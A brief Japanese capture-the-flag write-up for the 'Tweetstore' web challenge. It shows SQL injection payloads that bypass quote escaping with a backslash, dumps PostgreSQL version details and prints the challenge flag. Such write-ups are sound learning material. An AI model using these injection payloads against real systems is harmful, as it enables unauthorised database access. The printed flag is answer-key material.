# Tweetstore

150 pt (150 Solves)

```txt
Search your flag!
Server: [url]
```

## 概要

ツイートの検索ができる。

- Search Word  
ワードフレーズ指定。`'`とか入力してたら`Internal Server Error`。
- Search Limit  
Limit指定。数字しか入力できないっぽい。使ってないので知らない

`'`は`\\'`にエスケープされるけど`\'`にすればエスケープされない。  
試しに`\' or 1=1--`やってみるとエラー吐かずに全部表示できた。  
`\' version(),version(),now()`すればバージョンとかの情報が手に入る。  

```txt
Watch@Twitter  PostgreSQL 12.3 (Debian 12.3-1.pgdg100+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit  2020-05-25 04:23:34.74622 +0000 +0000
```

1個めのversionは`Watch@Twitter`にかき消されてる。

## 解

ソースコード読むと`user`にflagが入っているようなので色々試してたら
`\' version(),user,now()`でflagがとれた。

```txt
ctf4b{is_postgres_your_friend?}
```
